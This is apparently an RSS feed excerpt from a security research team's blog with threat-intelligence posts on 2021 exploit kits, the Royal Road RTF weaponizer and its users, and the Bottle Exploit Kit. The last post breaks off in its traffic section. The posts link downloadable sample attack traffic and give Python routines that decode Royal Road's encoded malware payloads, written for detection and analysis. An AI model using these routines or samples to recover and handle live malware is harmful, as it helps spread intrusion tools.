<p>In any case, Drive-by Download attacks are still being observed. Moreover, it is a little more active. This is irrelevant for most people. Because most people don’t use Internet Explorer. If you don’t use Internet Explorer, a typical Exploit Kit attack is not a threat. A small number of targeted attacks may use Chrome’s 0day, which is not discussed here.</p>

<p>For the few enthusiastic Internet Explorer users that exist, I write this blog post. In other words, as of April 2021, I will introduce the characteristics of common Drive-by Download attacks that you may encounter. Thanks to my friends (@jeromesegura, @nao_sec members) for helping me write this blog post.</p>

<h2 id="exploit-kit-landscape">Exploit Kit Landscape</h2>
<p>As of April 2021, the following 6 types of Exploit Kits have been observed to be active.</p>

<ul>
  <li>RIG</li>
  <li>Spelevo</li>
  <li>PurpleFox</li>
  <li>Underminer</li>
  <li>Bottle</li>
  <li>Magnitude</li>
</ul>

<p>nao_sec has been running a fully automatic Drive-by Download attack observation environment called Augma System[1] for three years. The data observed by this is as follows. Some Exploit Kits are not counted because they are observed in different environments.</p>

<p><img alt="" src="https://nao-sec.org/assets/2021-04-16/ek.png" /></p>

<p>The features of the 6 types of Exploit Kits currently observed are as follows.</p>

<table>
  <thead>
    <tr>
      <th> </th>
      <th>Private</th>
      <th>Update</th>
      <th>Exploit</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>RIG</td>
      <td>No</td>
      <td>Yes</td>
      <td>CVE-2020-0674, CVE-2021-26411</td>
    </tr>
    <tr>
      <td>Spelevo</td>
      <td>No</td>
      <td>No</td>
      <td>CVE-2018-8174, CVE-2018-15982</td>
    </tr>
    <tr>
      <td>PurpleFox</td>
      <td>Yes</td>
      <td>Yes</td>
      <td>CVE-2021-26411</td>
    </tr>
    <tr>
      <td>Underminer</td>
      <td>Yes</td>
      <td>No</td>
      <td>CVE-2018-15982</td>
    </tr>
    <tr>
      <td>Bottle</td>
      <td>Yes</td>
      <td>Yes</td>
      <td>CVE-2020-1380, CVE-2021-26411</td>
    </tr>
    <tr>
      <td>Magnitude</td>
      <td>Yes</td>
      <td>Yes</td>
      <td>CVE-2021-26411</td>
    </tr>
  </tbody>
</table>

<p>Here is sample traffic for each.</p>

<h3 id="rig-exploit-kit">RIG Exploit Kit</h3>
<p>RIG is an Exploit Kit that has been active since around 2014. It was extremely active from 2016 to 2017, but then declined with the advent of Fallout and others. However, it is still active in 2021.</p>

<p>RIG started abusing CVE-2021-26411 in April 2021 and are still incorporating changes. Landing Pages are not obfuscated as they used to be. Very simple code. The malware is RC4 encrypted.</p>

<p><img alt="" src="https://nao-sec.org/assets/2021-04-16/rig.png" /></p>

<p>Download sample traffic <a href="https://nao-sec.org/assets/2021-04-16/rig.saz">here</a>.</p>

<h3 id="spelevo-exploit-kit">Spelevo Exploit Kit</h3>
<p>Spelevo is an Exploit Kit that appeared in 2019. 2020 was very mature, but 2021 is one of the most active Exploit Kits.</p>

<p>Spelevo hasn’t changed for a long time. Spelevo hides the malware in the image. See this article[2] for detailed behavior.</p>

<p><img alt="" src="https://nao-sec.org/assets/2021-04-16/spelevo.png" /></p>

<p>Download sample traffic <a href="https://nao-sec.org/assets/2021-04-16/spelevo.saz">here</a>.</p>

<h3 id="purplefox-exploit-kit">PurpleFox Exploit Kit</h3>
<p>PurpleFox is an Exploit Kit that has been active since 2019. A private exploit kit for sending PurpleFox malware. It’s enthusiastic about exploit and is fairly fast at incorporating new vulnerabilities.</p>

<p>Spelevo has started to exploit CVE-2021-26411 in April 2021. However, the other parts have not changed for a long time.</p>

<p><img alt="" src="https://nao-sec.org/assets/2021-04-16/purplefox.png" /></p>

<p>Download sample traffic <a href="https://nao-sec.org/assets/2021-04-16/purplefox.saz">here</a>.</p>

<h3 id="underminer-exploit-kit">Underminer Exploit Kit</h3>
<p>Underminer is an Exploit Kit that appeared in 2018. It’s a pretty distinctive Exploit Kit. It is known to be extremely difficult to analyze. It is used to deliver its unique malware called Hidden Bee. See this article[3] for more details.</p>

<p>Underminer has a cycle of activity for several months and then silence for several months. It has been silent since the November 2020, but was revived in April 2021. But the essence hasn’t changed at all.</p>

<p><img alt="" src="https://nao-sec.org/assets/2021-04-16/underminer.png" /></p>

<p>Download sample traffic <a href="https://nao-sec.org/assets/2021-04-16/underminer.saz">here</a>.</p>

<h3 id="bottle-exploit-kit">Bottle Exploit Kit</h3>
<p>Bottle is an Exploit Kit that appeared in 2019. An extremely rare Exploit Kit that targets only Japan. It is used to deliver its unique malware called Cinobi.</p>

<p>It is one of the most active Exploit Kits in Japan. It has not been observed since November 2020, but it was revived in April 2021. It’s also worth noting that unlike other Exploit Kits, it exploits CVE-2020-1380 and CVE-2021-26411. It has been pointed out that it is related to MageCart and phishing campaigns. See this article[4] for more details.</p>

<p><img alt="" src="https://nao-sec.org/assets/2021-04-16/bottle.png" /></p>

<p>Download sample traffic <a href="https://nao-sec.org/assets/2021-04-16/bottle.saz">here</a>.</p>

<h3 id="magnitude-exploit-kit">Magnitude Exploit Kit</h3>
<p>Magnitude is one of the oldest existing Exploit Kits. It has been observed only in certain countries/regions such as South Korea and Taiwan, and the details have not been reported much.</p>

<p>Its activity was also reported in April 2021. It exploits CVE-2021-26411 and is still actively evolving.</p>

<blockquote class="twitter-tweet"><p dir="ltr" lang="en">One more: <a href="https://twitter.com/hashtag/MagnitudeEK?src=hash&amp;ref_src=twsrc%5Etfw">#MagnitudeEK</a> <a href="https://t.co/pOuIZzAPZG">pic.twitter.com/pOuIZzAPZG</a></p>&mdash; Jérôme Segura (@jeromesegura) <a href="https://twitter.com/jeromesegura/status/1382395637480656896?ref_src=twsrc%5Etfw">April 14, 2021</a></blockquote>


<h2 id="finally">Finally</h2>
<p>Drive-by Download attacks are still observed in 2021. It has nothing to do with most people. As with Adobe Flash Player, stop using Internet Explorer immediately. That is the simplest solution. Drive-by Download attacks continue to exist with Internet Explorer.</p>

<h2 id="references">References</h2>
<p>[1] <a href="https://www.virusbulletin.com/uploads/pdf/conference_slides/2019/VB2019-KoikeChubachi.pdf">https://www.virusbulletin.com/uploads/pdf/conference_slides/2019/VB2019-KoikeChubachi.pdf</a><br />
[2] <a href="https://insight-jp.nttsecurity.com/post/102gsqj/pseudogatespelevo-exploit-kit">https://insight-jp.nttsecurity.com/post/102gsqj/pseudogatespelevo-exploit-kit</a><br />
[3] <a href="https://blog.malwarebytes.com/threat-analysis/2019/08/the-hidden-bee-infection-chain-part-1-the-stegano-pack/">https://blog.malwarebytes.com/threat-analysis/2019/08/the-hidden-bee-infection-chain-part-1-the-stegano-pack/</a><br />
[4] <a href="http://jsac.jpcert.or.jp/archive/2021/pdf/JSAC2021_103_koike-takai_jp.pdf">http://jsac.jpcert.or.jp/archive/2021/pdf/JSAC2021_103_koike-takai_jp.pdf</a></p>
]]></content:encoded>
<pubDate>2021-04-15T15:00:00+00:00</pubDate>
</item>
<item>
<title>Royal Road! Re:Dive</title>
<link>http://nao-sec.org/2021/01/royal-road-redive.html</link>
<guid>http://nao-sec.org/2021/01/royal-road-redive.html</guid>
<content:encoded><![CDATA[
<p><img alt="" src="https://nao-sec.org/assets/2021-01-05/00.png" /></p>

<h2 id="abstract">Abstract</h2>
<p>We introduced the “Royal Road RTF Weaponizer” in our previous blog [1] (and presented at Japan Security Analyst Conference 2020 and CPX 360 CPRCon 2020). Royal Road is a tool shared by many targeted attack groups believed to belong to China. It’s been a year since our previous blog, and Royal Road is still in use. Here, we will introduce the Royal Road-related attacks observed during 2020.</p>

<h2 id="previous-blog">Previous Blog</h2>
<p>Let’s briefly review the previous blog. Royal Road is a tool that generates RTF files that exploit the Microsoft Office Equation Editor vulnerabilities (CVE-2017-11882, CVE-2018-0798, CVE-2018-0802). The details of the tool are unknown, but the RTF file generated by it has various characteristics. The definition of “RTF file generated by Royal Road” may vary from researcher to researcher. Therefore, we define a file that meets the following conditions as an “RTF file generated by Royal Road”.</p>

<ol>
  <li>Exploiting a vulnerability in Microsoft Office Equation Editor</li>
  <li>Containing an object named “8.t”</li>
</ol>

<p>However, some RTF files are likely to be related to Royal Road, even though they don’t meet the second condition. For classification purposes, we refer to this as “Related Samples”. In reality, this may also be an RTF file generated by Royal Road, but the truth is only known to the attacker. Due to the our research, we have divided these into “Royal Road Samples” and “Related Samples”. However, they are treated the same in the specific case studies below.</p>

<p>And Royal Road is shared among various attack groups believed to belong to China. Specifically, it is believed to be used by the following attack groups. The attack group alias is written for reference. Strictly speaking, these can be different. For example, TA428 and Pirate Panda are not exactly equivalent.</p>

<ol>
  <li>Temp.Tick (BRONZE BUTLER, RedBaldKnight)</li>
  <li>Temp.Conimes (Goblin Panda, Cycldek)</li>
  <li>Temp.Periscope (Leviathan, APT40)</li>
  <li>Temp.Trident (Dagger Panda, IceFog)</li>
  <li>Tonto (Karma Panda, CactusPete, LoneRanger)</li>
  <li>TA428 (Pirate Panda)</li>
  <li>Rancor</li>
</ol>

<p>Also, we categorized the various characteristics of the RTF files used by these groups and showed what they have in common.</p>

<p><img alt="" src="https://nao-sec.org/assets/2021-01-05/01.png" /></p>

<h2 id="updates">Updates</h2>
<p>It’s been a year since we introduced Royal Road. In the meantime, the RTF file, believed to have been generated by Royal Road, has been used many times in targeted attacks, and several updates have been observed. First of all, we will introduce the updates.</p>

<p>The RTF file generated by Royal Road contains encoded malware. It is decoded by Shellcode after exploit. In our previous blog, we introduced the following 5 encodings.</p>

<ol>
  <li>4D 5A 90 00  (not encoded)</li>
  <li>F2 A3 20 72</li>
  <li>B2 A6 6D FF</li>
  <li>B0 74 77 46</li>
  <li>B2 5A 6F 00</li>
</ol>

<p>Many of the RTF files we observed in 2020 used the 3rd and 4th encodings. However, a few samples used the new encodings. The following 2 encodings.</p>

<ol>
  <li>A9 A4 6E FE</li>
</ol>

<p><img alt="" src="https://nao-sec.org/assets/2021-01-05/02.png" /></p>

<p>This encoding can be decoded with code like the following:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">dec_data</span> <span class="o">=</span> <span class="p">[]</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">enc_data</span><span class="p">)):</span>
    <span class="n">dec_data</span><span class="p">.</span><span class="n">append</span><span class="p">(((</span><span class="nb">int</span><span class="p">.</span><span class="n">from_bytes</span><span class="p">(</span><span class="n">enc_data</span><span class="p">[</span><span class="n">i</span><span class="p">],</span>  <span class="s">"little"</span><span class="p">)</span> <span class="o">^</span> <span class="mh">0x7b</span><span class="p">)</span> <span class="o">+</span> <span class="mh">0x7b</span><span class="p">)</span> <span class="o">%</span> <span class="mi">256</span><span class="p">)</span>
</code></pre></div></div>

<ol>
  <li>94 5F DA D8</li>
</ol>

<p><img alt="" src="https://nao-sec.org/assets/2021-01-05/03.png" /></p>

<p>This encoding can be decoded with code like the following:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">dec_data</span> <span class="o">=</span> <span class="p">[]</span>
<span class="n">xor_key</span> <span class="o">=</span> <span class="mi">1387678300</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">enc_data</span><span class="p">)):</span>
    <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">7</span><span class="p">):</span>
        <span class="n">x0</span> <span class="o">=</span> <span class="p">(</span><span class="n">xor_key</span> <span class="o">&amp;</span> <span class="mh">0x20000000</span><span class="p">)</span> <span class="o">==</span> <span class="mh">0x20000000</span>
        <span class="n">x1</span> <span class="o">=</span> <span class="p">(</span><span class="n">xor_key</span> <span class="o">&amp;</span> <span class="mi">8</span><span class="p">)</span> <span class="o">==</span> <span class="mi">8</span>
        <span class="n">x2</span> <span class="o">=</span> <span class="n">xor_key</span> <span class="o">&amp;</span> <span class="mi">1</span>
        <span class="n">x3</span> <span class="o">=</span> <span class="mi">1</span> <span class="o">+</span> <span class="p">(</span><span class="n">x0</span> <span class="o">^</span> <span class="n">x1</span> <span class="o">^</span> <span class="n">x2</span><span class="p">)</span>
        <span class="n">xor_key</span> <span class="o">=</span> <span class="p">(</span><span class="n">xor_key</span> <span class="o">+</span> <span class="n">xor_key</span><span class="p">)</span> <span class="o">+</span> <span class="n">x3</span>
    <span class="n">dec_data</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="nb">int</span><span class="p">.</span><span class="n">from_bytes</span><span class="p">(</span><span class="n">enc_data</span><span class="p">[</span><span class="n">i</span><span class="p">],</span> <span class="s">"little"</span><span class="p">)</span> <span class="o">^</span> <span class="p">(</span><span class="n">xor_key</span> <span class="o">%</span> <span class="mi">256</span><span class="p">))</span>
</code></pre></div></div>

<p>Our tool for decrypting Royal Road encoded object is already available on GitHub. It also supports the above new encodings.</p>

<p><a href="https://github.com/nao-sec/rr_decoder">https://github.com/nao-sec/rr_decoder</a></p>

<h2 id="new-attack-groups">New Attack Groups</h2>
<p>As we mentioned earlier, several attack groups use Royal Road. The following eight attack groups have been observed to use Royal Road (including both Royal Road Samples and Related Samples) during 2020.</p>

<ol>
  <li>Temp.Conimes</li>
  <li>Tonto</li>
  <li>TA428</li>
  <li>Naikon</li>
  <li>Higaisa</li>
  <li>Vicious Panda</li>
  <li>FunnyDream</li>
  <li>TA410</li>
</ol>

<p>Of these, we have already reported on 1-3 attack groups in our previous blog. Temp.Conimes used NewCore RAT to attack Vietnamese organizations. Tonto used Bisonal to attack organizations in East Asia such as Russia.</p>

<p>And the TA428 was also particularly active, using PoisonIvy, Cotx RAT, Tmanger, and nccTrojan to attack East Asian organizations such as Mongolia. We will not cover these individual cases here, but if you are interested, see the IOC chapter. For TA428, the paper [2] and blogs [3][4][5] are available from NSJ (NTT Security Japan). Please refer to that.</p>

<p>For Naikon, CheckPoint Research reported [6], but unfortunately, we could not observe this. Therefore, in the following, we will introduce attack cases related to Royal Road for four groups (5-8).</p>

<h3 id="higaisa">Higaisa</h3>
<p>Higaisa is an attack group that seems to have been active since at least around 2016. It is primarily targeted at North Korean-related organizations and is believed to be aimed at stealing information using AttackBot, PIZ Stealer, and Gh0st RAT.</p>

<p>The blogs have been written by Tencent and Positive Technologies so far [7][8][9], and are attributed to (South) Korea. However, NSJ’s paper [10] showed a connection with Ghost Dragon [11] and PKPLUG [12], and it was reported that it might belong to China.</p>

<p>We observed an attack by Higaisa on Royal Road in March 2020.</p>

<p><img alt="" src="https://nao-sec.org/assets/2021-01-05/04.png" /></p>

<p><img alt="" src="https://nao-sec.org/assets/2021-01-05/05.png" /></p>

<p><img alt="" src="https://nao-sec.org/assets/2021-01-05/06.png" /></p>

<p>The malware executed by the Royal Road RTF was AttackBot. AttackBot is a downloader that has been used by Higaisa since at least April 2018.</p>

<p><img alt="" src="https://nao-sec.org/assets/2021-01-05/07.png" /></p>

<h3 id="vicious-panda">Vicious Panda</h3>
<p>Vicious Panda is an attack group reported by CheckPoint Research in March 2020 [13]. It is said to belong to China and targets East Asia such as Russia, Mongolia, and Ukraine.</p>

<p>We observed an attack on the Royal Road by Vicious Panda in March 2020.</p>

<p><img alt="" src="https://nao-sec.org/assets/2021-01-05/08.png" /></p>

<p>It has been reported to execute malware similar to Enfal and BYEBY.</p>

<p><img alt="" src="https://nao-sec.org/assets/2021-01-05/09.png" /></p>

<p><img alt="" src="https://nao-sec.org/assets/2021-01-05/10.png" /></p>

<h3 id="funnydream">FunnyDream</h3>
<p>FunnyDream is an attack group that is said to have been active since around 2018. It is said to belong to China and targets Southeast Asia such as Vietnam and Malaysia. FunnyDream uses Chinoxy and FunnyDream Backdoor. BitDefender has published a detailed report [14] on FunnyDream.</p>

<p>We observed an attack by FunnyDream from March to May 2020.</p>

<p><img alt="" src="https://nao-sec.org/assets/2021-01-05/11.png" /></p>

<p><img alt="" src="https://nao-sec.org/assets/2021-01-05/12.png" /></p>

<p><img alt="" src="https://nao-sec.org/assets/2021-01-05/13.png" /></p>

<p>Chinoxy is a RAT that has been used by FunnyDream since around 2018. It decoded the config using two numeric data and communicates with the C&amp;C server using its original protocol using Blowfish.</p>

<h3 id="ta410">TA410</h3>
<p>TA410 is an attack group that is said to have been active since around 2016. It is said to belong to China and is suspected to be related to APT10. The report has been published by Proofpoint [15][16][17] and is mainly targeted at public sector in the US. It uses malware called LockBack and FlowCloud.</p>

<p>We observed an attack by TA410 in October 2020.</p>

<p><img alt="" src="https://nao-sec.org/assets/2021-01-05/15.png" /></p>

<p><img alt="" src="https://nao-sec.org/assets/2021-01-05/16.png" /></p>

<p>FlowCloud is a RAT reported by Proofpoint in June 2020. FlowCloud has been reported to be v4 and v5, but the FlowCloud we observed at this time was similar to v4.</p>

<h2 id="attack-case-against-japan">Attack case against Japan</h2>
<p>In addition to the four attack groups shown so far (Higaisa, Vicious Panda, FunnyDream, TA410), attacks that appear to be related to Royal Road have been observed. Among them, we will introduce an example of attacks on Japan. We are not able to identify which attack group made this attack. If you have any knowledge about it, please share it with us…</p>

<p>The attack on Japan took place in November 2020. The attack began with 2 RTF files attached to the email.</p>

<p><img alt="" src="https://nao-sec.org/assets/2021-01-05/18.png" /></p>

<p><img alt="" src="https://nao-sec.org/assets/2021-01-05/19.png" /></p>

<p>These RTF files did not contain an 8.t object, however  did contain an associated object. This is the malware encoded by the 4th (B0 74 77 46) encoding shown above.</p>

<p><img alt="" src="https://nao-sec.org/assets/2021-01-05/20.png" /></p>

<p>The overall picture of the attack is as follows.</p>

<p><img alt="" src="https://nao-sec.org/assets/2021-01-05/21.png" /></p>

<p>The malware executed was an unknown RAT. We call this XLBug RAT because of the characteristics left in this RAT. The RAT held information such as C&amp;C server encoded by Base64 and XOR.</p>

<p><img alt="" src="https://nao-sec.org/assets/2021-01-05/22.png" /></p>

<p>The following commands are implemented in XLBug RAT.</p>

<ul>
  <li>Get directory information</li>
  <li>Get file information</li>
  <li>Get computer information</li>
  <li>Execute file</li>
  <li>Upload file</li>
  <li>Download file</li>
  <li>Rename file</li>
  <li>Delete file</li>
  <li>Delete itself</li>
</ul>

<p>The naming convention and encoding of the encoded object contained in the RTF are similar to those of the TA428. However, we could not say that this was a TA428 attack.</p>

<h2 id="relationship">Relationship</h2>
<p>In the previous blog, we summarized the characteristics of attack groups that use Royal Road. We used it to divide the attack groups into two groups. However, by 2020, those characteristics are almost meaningless. It has been standardized or deleted. It’s not as easy to group as it used to be. In the first place, the groups sharing Royal Road should be close. We do not classify further, but if you have any comments please let us know.</p>

<h2 id="yara-rule">Yara Rule</h2>
<p>The GitHub repository we shared in the previous blog is still being updated.</p>

<p><a href="https://github.com/nao-sec/yara_rules">https://github.com/nao-sec/yara_rules</a></p>

<h2 id="ioc">IOC</h2>
<p>The IOC sheet shared in the previous blog is still being updated.</p>

<p><a href="https://nao-sec.org/jsac2020_ioc.html">https://nao-sec.org/jsac2020_ioc.html</a></p>

<h2 id="tool">Tool</h2>
<p>The tool used by Royal Road to decrypt encoded object is still being updated.</p>

<p><a href="https://github.com/nao-sec/rr_decoder">https://github.com/nao-sec/rr_decoder</a></p>

<h2 id="wrap-up">Wrap-Up</h2>
<p>The attacks using Royal Road have decreased compared to 2019, but are still ongoing. There are many cases of attacks by TA428 and Tonto, but other attacks by different attack groups (Higaisa, Vicious Panda, FunnyDream, TA410) have also been observed.</p>

<p>The attacks on Japan have also been observed and we were unable to identify this with a known attack group. The use of Royal Road by these unknown attack groups is expected to continue.</p>

<p>In addition to Royal Road, there are other cases, such as the Tmanger family, that appear to share tools among multiple targeted attack groups. We should continue to pay close attention to these tool sharing cases.</p>

<h2 id="acknowledgments">Acknowledgments</h2>
<p>“nao_sec” is an independent research team that does not belong to any company. Individuals belong to each company and engage in research, but the activities of nao_sec still maintain their independence from each company. We are grateful to all of you who cooperated with our research activities every day.</p>

<hr />

<h2 id="references">References</h2>
<p>[1] nao_sec, “An Overhead View of the Royal Road”, https://nao-sec.org/2020/01/an-overhead-view-of-the-royal-road.html<br />
[2] NTT Security Japan, “Operation LagTime IT: colourful Panda footprint”, https://vblocalhost.com/uploads/VB2020-Ozawa-etal.pdf<br />
[3] NTT Security Japan, “Panda’s New Arsenal: Part 1 Tmanger”, https://insight-jp.nttsecurity.com/post/102gi9b/pandas-new-arsenal-part-1-tmanger<br />
[4] NTT Security Japan, “Panda’s New Arsenal: Part 2 Albaniiutas”, https://insight-jp.nttsecurity.com/post/102gkfp/pandas-new-arsenal-part-2-albaniiutas<br />
[5] NTT Security Japan, “Panda’s New Arsenal: Part 3 Smanager”, https://insight-jp.nttsecurity.com/post/102glv5/pandas-new-arsenal-part-3-smanager<br />
[6] CheckPoint Research, “Naikon APT: Cyber Espionage Reloaded”, https://research.checkpoint.com/2020/naikon-apt-cyber-espionage-reloaded/<br />
[7] Tencent, “APT攻击组织”黑格莎（Higaisa）”攻击活动披露”, https://s.tencent.com/research/report/836.html<br />
[8] Tencent, ““Higaisa（黑格莎）”组织近期攻击活动报告”, https://s.tencent.com/research/report/895.html<br />
[9] Positive Technologies, “COVID-19 и новогодние поздравления: исследуем инструменты группировки Higaisa”, https://www.ptsecurity.com/ru-ru/research/pt-esc-threat-intelligence/covid-19-i-novogodnie-pozdravleniya-issleduem-instrumenty-gruppirovki-higaisa/<br />
[10] NTT Security Japan, “Crafty Panda 標的型攻撃解析レポート”, https://www.nttsecurity.com/docs/librariesprovider3/default-document-library/craftypanda-analysis-report<br />
[11] Cylance (BlackBerry), “The Ghost Dragon”, https://blogs.blackberry.com/en/2016/04/the-ghost-dragon<br />
[12] Palo Alto Networks, “PKPLUG: Chinese Cyber Espionage Group Attacking Southeast Asia”, https://unit42.paloaltonetworks.com/pkplug_chinese_cyber_espionage_group_attacking_asia/<br />
[13] CheckPoint Research, “Vicious Panda: The COVID Campaign”, https://research.checkpoint.com/2020/vicious-panda-the-covid-campaign/<br />
[14] BitDefender, “A Detailed Timeline of a Chinese APT Espionage Attack Targeting South Eastern Asian Government Institutions”, https://labs.bitdefender.com/2020/11/a-detailed-timeline-of-a-chinese-apt-espionage-attack-targeting-south-eastern-asian-government-institutions/<br />
[15] Proofpoint, “LookBack Malware Targets the United States Utilities Sector with Phishing Attacks Impersonating Engineering Licensing Boards”, https://www.proofpoint.com/us/threat-insight/post/lookback-malware-targets-united-states-utilities-sector-phishing-attacks<br />
[16] Proofpoint, “LookBack Forges Ahead: Continued Targeting of the United States’ Utilities Sector Reveals Additional Adversary TTPs”, https://www.proofpoint.com/us/threat-insight/post/lookback-forges-ahead-continued-targeting-united-states-utilities-sector-reveals<br />
[17] Proofpoint, “TA410: The Group Behind LookBack Attacks Against U.S. Utilities Sector Returns with New Malware”, https://www.proofpoint.com/us/blog/threat-insight/ta410-group-behind-lookback-attacks-against-us-utilities-sector-returns-new</p>
]]></content:encoded>
<pubDate>2021-01-04T15:00:00+00:00</pubDate>
</item>
<item>
<title>An Overhead View of the Royal Road</title>
<link>http://nao-sec.org/2020/01/an-overhead-view-of-the-royal-road.html</link>
<guid>http://nao-sec.org/2020/01/an-overhead-view-of-the-royal-road.html</guid>
<content:encoded><![CDATA[
<h2 id="abstract">Abstract</h2>
<p>Several targeted attack groups share the tools used in the attack and are reported to be doing similar attacks. Attack tools are also shared in attacks targeting Japanese organizations, for example, Tick. Tick may use a tool called Royal Road RTF Weaponizer. And Royal Road is used by targeted attack groups such as Goblin Panda and Temp.Trident that is suspected of being involved in China.</p>

<p>In this blog, we will focus on the Royal Road, and introduce the features of the tool, such as the outline of the tool, its behavior, and the exploited vulnerability. Next, the targeted attack groups that use the Royal Road are listed, and each attack case is shown in detail. We have collected over 100 malicious documents from 2018 and investigated malware that is deployed and downloaded from there. Even in groups using the same Royal Road, we attributed them based on the target country/organization, the technique used for the attack, the malware executed, etc.</p>

<p>There are a wide variety of countries/organizations targeted for attack, mainly in Asia. Such information has been published by researchers all over the world, but it’s not widely known that Royal Road is used in Tick attacks targeting Japanese organizations. Attacks using Royal Road are still active in 2019. Share analysis results of malicious documents and malware based on the cases we observed. Other targeted attack groups may be related to Royal Road. We introduce the attack cases of these attack groups and show their relevance.</p>

<p>Finally, we show the hunting technique using the characteristics of RTF files using Royal Road and the techniques that are preferred by targeted attack groups that use them. This blog will help researchers who are researching and analyzing targeted attacks and CSIRT/SOC members to understand the attacks and take countermeasures.</p>

<h2 id="summary">Summary</h2>
<h3 id="royal-road">Royal Road</h3>
<p>Royal Road is RTF weaponizer that named by Anomali. Sometimes called “8.t RTF exploit builder”. This tool is not OSS, However it’s shared between multiple actors.</p>

<p>We define the RTFs generated by RoyalRoad is supposed to satisfy the following two conditions:</p>
<ol>
  <li>Exploit the vulnerability in the Equation Editor</li>
  <li>Have an object named 8.t in the RTF</li>
</ol>

<p>Royal Road behaves as follows.</p>

<ol>
  <li>
    <p>RTF create a file (8.t) using ActiveX Control “Package” when opening a document</p>
  </li>
  <li>All Vulnerabilities used by exploit coed are based on Equation Editor.
    <ul>
      <li>CVE-2017-11882</li>
      <li>CVE-2018-0798</li>
      <li>CVE-2018-0802</li>
    </ul>
  </li>
  <li>It decode 8.t, execute malware, dll-sideloading, etc</li>
</ol>

<p><img alt="" src="https://nao-sec.org/assets/2020-01-30/behavior.png" /></p>

<p>Classification v1-v5 defined by Proofpoint and Anomali published at VB2019. We are doing more research about RTF Object. RTF analysis showed that there was a special byte sequence immediately before the shellcode. We called that an object pattern. 8.t encoding is not distinguished by version. It’s considered an actor distinction rather than a tool distinction.</p>

<p>About v3, RTF including 8.t could not be found in our survey, so we define this as RoyalRoad-related, not RoyalRoad.</p>

<p>New version definitions for v6 and later. The object string has changed a little since v5, but it is basically the same. v7 has a very different object string. v7 object pattern is same as v4-v6, but part ofobject data exists randomly.</p>

<p><img alt="" src="https://nao-sec.org/assets/2020-01-30/version.png" /></p>

<h3 id="for-attribution">For attribution</h3>
<ul>
  <li>Time
    <ul>
      <li>submission to public service</li>
      <li>RTF creation</li>
    </ul>
  </li>
  <li>Target country
    <ul>
      <li>decoy file language</li>
    </ul>
  </li>
  <li>RTF characteristics
    <ul>
      <li>Object strings</li>
      <li>Object patterns</li>
      <li>Package patterns</li>
      <li>Object name, Path</li>
    </ul>
  </li>
  <li>Payload encoding patterns</li>
  <li>Dropped file name</li>
  <li>Malware execution techniques
    <ul>
      <li>T1137 (Office Application Startup)</li>
      <li>T1073 (DLL Side-Loading)</li>
    </ul>
  </li>
  <li>Final payload (malware family)</li>
</ul>

<h3 id="actors">Actors</h3>
<p>Here are the actors that have been confirmed to use RoyalRoad. It is considered that China’s involvement is suspected.</p>

<p><img alt="" src="https://nao-sec.org/assets/2020-01-30/actor1.png" />
<img alt="" src="https://nao-sec.org/assets/2020-01-30/actor2.png" /></p>

<p>These are tables summarizing each actor’s characteristics. We categorize these actors into three groups.</p>

<p><img alt="" src="https://nao-sec.org/assets/2020-01-30/actor_details.png" /></p>

<h3 id="group">Group</h3>
<ul>
  <li>Group-A is Conimes, Periscope and Rancor.</li>
  <li>Group-B is Trident, Tick, TA428 and Tonto.</li>
  <li>Group-C is something else we don’t know.</li>
</ul>

<p><img alt="" src="https://nao-sec.org/assets/2020-01-30/group.png" /></p>

<p>Group-A is targeting Southeast Asia. Periscope and Conimes ware active at the same time and share the same techniques. Conimes and Rancor ware also active at the same time and share some techniques. We believe these groups are close and may share tools and insights.</p>

<p><img alt="" src="https://nao-sec.org/assets/2020-01-30/groupA.png" /></p>

<p>Group-B is including Trident, Tick, TA428 and Tonto. These are actors targeting East Asia, especially Russia, Korea and Japan. Tick, TA428 and Tonto may use the same technique. Especially Tick and Tonto are very similar. We believe that Group-B actors are very close and share techniques and insights.</p>

<p><img alt="" src="https://nao-sec.org/assets/2020-01-30/groupB.png" /></p>

<h3 id="wrap-up">Wrap-up</h3>
<p>The RTF file created using the Royal Road exploits a vulnerability in the equation editor. The RTF file has a various of characteristics that help with attribution.
There are many actors who use Royal Road. We can divide them into three groups and suppose connections between actors.</p>

<h3 id="appendix">Appendix</h3>
<h4 id="appendix-1-ioc">Appendix-1: IOC</h4>
<ul>
  <li><a href="https://nao-sec.org/jsac2020_ioc.html">https://nao-sec.org/jsac2020_ioc.html</a></li>
</ul>

<h4 id="appendix-2-tool">Appendix-2: Tool</h4>
<ul>
  <li><a href="https://github.com/nao-sec/rr_decoder">rr_decoder</a></li>
  <li><a href="https://github.com/nao-sec/yara_rules">Yara Rules</a></li>
</ul>

<hr />

<p>Full report is here: <a href="https://github.com/nao-sec/materials/raw/master/JSAC%2BCPRCon2020/An_Overhead_View_of_the_Royal_Road.pdf">[PDF (EN)]</a></p>
]]></content:encoded>
<pubDate>2020-01-29T15:00:00+00:00</pubDate>
</item>
<item>
<title>Say hello to Bottle Exploit Kit targeting Japan</title>
<link>http://nao-sec.org/2019/12/say-hello-to-bottle-exploit-kit.html</link>
<guid>http://nao-sec.org/2019/12/say-hello-to-bottle-exploit-kit.html</guid>
<content:encoded><![CDATA[
<h2 id="first">First</h2>
<p>On December 11, 2019, we were strolling through ad-networks. As before, we observed RIG, Fallout and Underminer Exploit Kit, but observed other interesting Drive-by Download attack. We call it “Bottle Exploit Kit”. BottleEK targets only Japanese users. According to our research, BottleEK has been active at least in September 2019. This time we introduce BottleEK.</p>

<p><img alt="" src="https://nao-sec.org/assets/2019-12-13/0.gif" /></p>

<p>Sample traffic data is <a href="https://www.virustotal.com/gui/file/5195da2b95ec7b13876ccca113cf6816146788fddbe99f16e3cb6af34f6c0822/detection">here</a>.</p>

<h2 id="traffic">Traffic</h2>
<p><img alt="" src="https://nao-sec.org/assets/2019-12-13/1.png" /></p>

<p>We have confirmed that we are redirected to BottleEK by malvertising. When you are redirected from ad-network to BottleEK, the landing page html is loaded first. The landing page loads two JavaScipt files.</p>

